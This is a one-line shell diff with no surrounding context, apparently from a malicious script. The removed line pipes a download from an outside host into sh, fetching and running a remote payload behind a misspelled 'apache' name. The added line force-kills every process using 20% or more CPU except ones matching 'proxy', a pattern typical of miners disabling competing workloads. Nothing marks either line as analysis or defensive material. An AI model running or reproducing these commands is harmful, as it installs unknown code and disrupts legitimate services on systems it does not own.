@@ -1,1 +1,1 @@
-curl http://xhv.f3322.net/apahce | sh 
+ps -e -o "pid %cpu CMD"|grep -v proxy|   awk '{if($2>=20.0) print $1}' | while read procid; do kill -9 $procid; done 
